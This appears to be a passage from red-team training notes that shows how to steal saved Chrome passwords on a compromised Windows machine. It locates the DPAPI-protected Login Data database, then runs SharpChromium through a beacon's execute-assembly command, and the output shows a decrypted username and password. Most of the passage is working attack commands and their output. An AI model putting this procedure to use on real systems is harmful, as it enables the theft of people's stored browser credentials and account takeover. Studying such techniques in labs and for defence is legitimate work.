Chrome stores DPAPI-protected credentials in a local SQLite database, which can be found within the user's local `AppData` directory.

```
beacon> ls C:\Users\bfarmer\AppData\Local\Google\Chrome\User Data\Default

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 40kb     fil     02/25/2021 13:21:18   Login Data
```

  

A non-null `Login Data` file is a good indication that credentials are saved in here. [SharpChromium](https://github.com/djhohnstein/SharpChromium) is my go-to tool for decrypting these.

```
beacon> execute-assembly C:\Tools\SharpChromium\bin\Debug\SharpChromium.exe logins

[*] Beginning Google Chrome extraction.

--- Chromium Credential (User: bfarmer) ---
URL      : 
Username : bfarmer
Password : Sup3rman

[*] Finished Google Chrome extraction.
[*] Done.
```